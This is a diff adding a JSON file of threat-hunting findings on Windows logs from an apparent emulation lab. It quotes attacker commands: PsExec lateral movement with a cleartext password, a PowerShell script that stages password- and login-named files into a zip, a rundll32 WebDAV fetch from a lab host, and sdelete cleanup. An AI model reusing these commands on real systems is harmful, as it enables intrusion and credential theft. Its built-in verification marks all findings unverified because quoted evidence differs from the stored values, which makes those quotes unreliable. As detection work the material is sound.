@@ -1,0 +1,376 @@
+[
+  {
+    "technique": "T1078",
+    "title": "Harvested domain credentials (pbeesly) used in cleartext with PsExec for lateral movement to NASHUA",
+    "assessment": "malicious",
+    "confidence": "high",
+    "summary": "On 2020-05-01 23:11:18–23:15:03 EDT, on scranton.dmevals.local, a PowerShell parent launched Sysinternals PsExec64.exe with the domain account's password supplied in cleartext on the command line: \"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe. This is repeated at 23:12:25 and 23:13:28. On the target nashua.dmevals.local the PSEXESVC service was installed (7045) and C:\\Windows\\Temp\\python.exe was executed as pbeesly (parent C:\\Windows\\PSEXESVC.exe), with matching 4648 explicit-credential logons (pbeesly -> cifs/NASHUA from 10.0.1.6, and PSEXESVC.exe using pbeesly's credentials on nashua). The cleartext password indicates the attacker had already obtained pbeesly's credential and reused it to move laterally.",
+    "evidence": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSP1_",
+        "field": "process.command_line",
+        "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+        "query_id": "q-70a362d44d"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSCpJ",
+        "field": "process.command_line",
+        "value": "\"C:\\Windows\\Temp\\python.exe\" (parent C:\\Windows\\PSEXESVC.exe, user pbeesly, host nashua.dmevals.local)",
+        "query_id": "q-70a362d44d"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YogQzA",
+        "field": "win.ProcessName",
+        "value": "C:\\Windows\\PSEXESVC.exe (4648 explicit-credential logon using pbeesly, host nashua.dmevals.local)",
+        "query_id": "q-c56742de40"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSP2J",
+        "field": "win.TargetServerName",
+        "value": "NASHUA (4648 from 10.0.1.6, cifs/NASHUA, user pbeesly)",
+        "query_id": "q-ab0cb05cad"
+      },
+      {
+        "index": ".ds-logs-windows.other-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1aOnx2T",
+        "field": "message",
+        "value": "Service Name: PSEXESVC / Service File Name: %SystemRoot%\\PSEXESVC.exe (host nashua.dmevals.local, user pbeesly)",
+        "query_id": "q-14b1e0b4c7"
+      }
+    ],
+    "finding_id": "F01",
+    "verification": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSP1_",
+        "field": "process.command_line",
+        "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+        "query_id": "q-70a362d44d",
+        "ok": true,
+        "problems": [],
+        "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+        "timestamp": "2020-05-01T23:11:18.000-04:00",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSCpJ",
+        "field": "process.command_line",
+        "claimed": "\"C:\\Windows\\Temp\\python.exe\" (parent C:\\Windows\\PSEXESVC.exe, user pbeesly, host nashua.dmevals.local)",
+        "query_id": "q-70a362d44d",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "\"C:\\Windows\\Temp\\python.exe\" ",
+        "timestamp": "2020-05-01T23:11:40.000-04:00",
+        "host": "nashua.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YogQzA",
+        "field": "win.ProcessName",
+        "claimed": "C:\\Windows\\PSEXESVC.exe (4648 explicit-credential logon using pbeesly, host nashua.dmevals.local)",
+        "query_id": "q-c56742de40",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "C:\\Windows\\PSEXESVC.exe",
+        "timestamp": "2020-05-01T23:11:40.000-04:00",
+        "host": "nashua.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YcSP2J",
+        "field": "win.TargetServerName",
+        "claimed": "NASHUA (4648 from 10.0.1.6, cifs/NASHUA, user pbeesly)",
+        "query_id": "q-ab0cb05cad",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "NASHUA",
+        "timestamp": "2020-05-01T23:11:18.000-04:00",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.other-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1aOnx2T",
+        "field": "message",
+        "claimed": "Service Name: PSEXESVC / Service File Name: %SystemRoot%\\PSEXESVC.exe (host nashua.dmevals.local, user pbeesly)",
+        "query_id": "q-14b1e0b4c7",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "A service was installed in the system.\r\n\r\nService Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem",
+        "timestamp": "2020-05-01T23:11:39.000-04:00",
+        "host": "nashua.dmevals.local",
+        "dataset": "windows.other"
+      }
+    ],
+    "verified": false,
+    "verified_evidence": 1
+  },
+  {
+    "technique": "T1003",
+    "title": "Credential access via LSA secret query (4662 Policy\\Secrets\\$MACHINE.ACC) — benign OS behavior",
+    "assessment": "benign",
+    "confidence": "high",
+    "summary": "Check C044 returned 7 event.code:4662 hits. Six are LSA SecretObject queries of Policy\\Secrets\\$MACHINE.ACC performed by NT AUTHORITY\\LOCAL SERVICE (S-1-5-19, logon 0x3E5) on nashua/scranton/utica — this is routine machine-account secret access by the OS, not attacker credential dumping. The seventh (newyork.dmevals.local, 23:16:15) is a DS Object Access by the machine account NEWYORK$ (S-1-5-18) referencing replication GUID {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} with AccessMask 0x100; it is a machine-account directory access, not a non-machine DCSync by a user account, and no 4662 with the DS-Replication-Get-Changes GUIDs was found for a user principal. No credential-dumping tooling (lsass/mimikatz/procdump/comsvcs) was observed in sysmon process creation.",
+    "evidence": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YdT8L5",
+        "field": "win.ObjectName",
+        "value": "Policy\\Secrets\\$MACHINE.ACC (SubjectUserName LOCAL SERVICE, S-1-5-19, host nashua.dmevals.local)",
+        "query_id": "q-145e3ff035"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1Ymd5OC",
+        "field": "win.Properties",
+        "value": "Control Access {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (SubjectUserName NEWYORK$, S-1-5-18, host newyork.dmevals.local)",
+        "query_id": "q-df72210e9f"
+      }
+    ],
+    "finding_id": "F02",
+    "verification": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YdT8L5",
+        "field": "win.ObjectName",
+        "claimed": "Policy\\Secrets\\$MACHINE.ACC (SubjectUserName LOCAL SERVICE, S-1-5-19, host nashua.dmevals.local)",
+        "query_id": "q-145e3ff035",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "Policy\\Secrets\\$MACHINE.ACC",
+        "timestamp": "2020-05-01T23:02:59.000-04:00",
+        "host": "nashua.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1Ymd5OC",
+        "field": "win.Properties",
+        "claimed": "Control Access {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (SubjectUserName NEWYORK$, S-1-5-18, host newyork.dmevals.local)",
+        "query_id": "q-df72210e9f",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "%%7688\r\n\t\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n",
+        "timestamp": "2020-05-01T23:16:15.000-04:00",
+        "host": "newyork.dmevals.local",
+        "dataset": "windows.security"
+      }
+    ],
+    "verified": false,
+    "verified_evidence": 0
+  },
+  {
+    "technique": "T1560.001",
+    "title": "Archive-and-collect of user documents to Draft.Zip on scranton",
+    "assessment": "malicious",
+    "confidence": "high",
+    "summary": "On scranton.dmevals.local at 2020-05-01 22:56:17 EDT, a PowerShell script block (user pbeesly, ScriptBlock ID 07c253ad-a7e6-4bc1-b789-f147e0506b84) enumerated the user profile for document/credential-interesting extensions (*.doc,*.xls,*.pdf,*.pst,*pass*,*login*,*admin*,*vpn, etc.) and compressed them with Compress-Archive to $env:APPDATA\\Draft.Zip. This is collection/staging of data (including files matching password/login keywords) prior to exfiltration.",
+    "evidence": [
+      {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1b87aOf",
+        "field": "powershell.script_block_text",
+        "value": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,...,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,...; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force",
+        "query_id": "q-403761879d"
+      }
+    ],
+    "finding_id": "F03",
+    "verification": [
+      {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1b87aOf",
+        "field": "powershell.script_block_text",
+        "claimed": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,...,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,...; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force",
+        "query_id": "q-403761879d",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force",
+        "timestamp": "2020-05-01T22:56:17.000-04:00",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.powershell"
+      }
+    ],
+    "verified": false,
+    "verified_evidence": 0
+  },
+  {
+    "technique": "T1071.001",
+    "title": "Suspicious .scr payload in ProgramData with outbound C2 and WebDAV access",
+    "assessment": "malicious",
+    "confidence": "high",
+    "summary": "On scranton.dmevals.local at 2020-05-01 22:55:56 EDT, C:\\ProgramData\\victim\\cod.3aka3.scr (SHA256 0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4) was launched by explorer.exe as user DMEVALS\\pbeesly, spawning cmd.exe and powershell.exe. The payload made an outbound network connection to 192.168.0.5:1234 (sysmon event 3), and later rundll32 davclnt.dll,DavSetCookie was used to reach http://192.168.0.4/webdav. The binary was then deleted with Sysinternals sdelete64.exe (anti-forensics).",
+    "evidence": [
+      {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WiJkSG",
+        "field": "process.command_line",
+        "value": "\"C:\\ProgramData\\victim\\cod.3aka3.scr\" /S (parent C:\\Windows\\explorer.exe, user DMEVALS\\pbeesly)",
+        "query_id": "q-ab1886361f"
+      },
+      {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WiJUTX",
+        "field": "destination.ip",
+        "value": "192.168.0.5:1234 (process C:\\ProgramData\\victim\\cod.3aka3.scr)",
+        "query_id": "q-5f11cd2b6c"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YeU-Dp",
+        "field": "process.command_line",
+        "value": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",
+        "query_id": "q-70a362d44d"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YiZqBf",
+        "field": "process.command_line",
+        "value": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+        "query_id": "q-b60c222b2b"
+      }
+    ],
+    "finding_id": "F04",
+    "verification": [
+      {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WiJkSG",
+        "field": "process.command_line",
+        "claimed": "\"C:\\ProgramData\\victim\\cod.3aka3.scr\" /S (parent C:\\Windows\\explorer.exe, user DMEVALS\\pbeesly)",
+        "query_id": "q-ab1886361f",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "\"C:\\ProgramData\\victim\\â€®cod.3aka3.scr\" /S",
+        "timestamp": "2020-05-02T02:55:56.157Z",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.sysmon"
+      },
+      {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WiJUTX",
+        "field": "destination.ip",
+        "claimed": "192.168.0.5:1234 (process C:\\ProgramData\\victim\\cod.3aka3.scr)",
+        "query_id": "q-5f11cd2b6c",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "192.168.0.5",
+        "timestamp": "2020-05-02T02:55:59.631Z",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.sysmon"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YeU-Dp",
+        "field": "process.command_line",
+        "claimed": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",
+        "query_id": "q-70a362d44d",
+        "ok": false,
+        "problems": [
+          "cited query did not return this event"
+        ],
+        "actual": "rundll32.exe C:\\windows\\system32\\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",
+        "timestamp": "2020-05-01T23:08:50.000-04:00",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YiZqBf",
+        "field": "process.command_line",
+        "claimed": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+        "query_id": "q-b60c222b2b",
+        "ok": true,
+        "problems": [],
+        "actual": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+        "timestamp": "2020-05-01T23:02:04.000-04:00",
+        "host": "scranton.dmevals.local",
+        "dataset": "windows.security"
+      }
+    ],
+    "verified": false,
+    "verified_evidence": 1
+  },
+  {
+    "technique": "T1110",
+    "title": "4776 credential validation and 4624 type-3 logons — benign, no brute force",
+    "assessment": "benign",
+    "confidence": "medium",
+    "summary": "Check C083 returned a single event.code:4776 (newyork.dmevals.local, 23:20:40, account pbeesly, Error Code 0x0 = success) — a successful credential validation, not a failure burst, so no password-guessing is evidenced. The 218 event.code:4624 win.LogonType:3 hits are dominated by machine-account (NEWYORK$) network logons from ::1/fe80 addresses and by pbeesly's legitimate network logons; the pbeesly type-3 logons from 10.0.1.4/10.0.1.6 to nashua/newyork are the lateral-movement authentication described in the PsExec finding rather than brute force.",
+    "evidence": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YQHwYC",
+        "field": "message",
+        "value": "Logon Account: pbeesly / Source Workstation: 10.0.1.4 / Error Code: 0x0 (4776, host newyork.dmevals.local)",
+        "query_id": "q-bf9db96255"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YhYtYy",
+        "field": "win.LogonType",
+        "value": "3 (4624, user pbeesly, source.ip 10.0.1.4, host newyork.dmevals.local)",
+        "query_id": "q-18aa9ce161"
+      }
+    ],
+    "finding_id": "F05",
+    "verification": [
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YQHwYC",
+        "field": "message",
+        "claimed": "Logon Account: pbeesly / Source Workstation: 10.0.1.4 / Error Code: 0x0 (4776, host newyork.dmevals.local)",
+        "query_id": "q-bf9db96255",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "The computer attempted to validate the credentials for an account.\r\n\r\nAuthentication Package:\tMICROSOFT_AUTHENTICATION_PACKAGE_V1_0\r\nLogon Account:\tpbeesly\r\nSource Workstation:\t10.0.1.4\r\nError Code:\t0x0",
+        "timestamp": "2020-05-01T23:20:40.000-04:00",
+        "host": "newyork.dmevals.local",
+        "dataset": "windows.security"
+      },
+      {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YhYtYy",
+        "field": "win.LogonType",
+        "claimed": "3 (4624, user pbeesly, source.ip 10.0.1.4, host newyork.dmevals.local)",
+        "query_id": "q-18aa9ce161",
+        "ok": false,
+        "problems": [
+          "claimed value differs from the stored value"
+        ],
+        "actual": "3",
+        "timestamp": "2020-05-01T23:04:04.000-04:00",
+        "host": "newyork.dmevals.local",
+        "dataset": "windows.security"
+      }
+    ],
+    "verified": false,
+    "verified_evidence": 0
+  }
+]
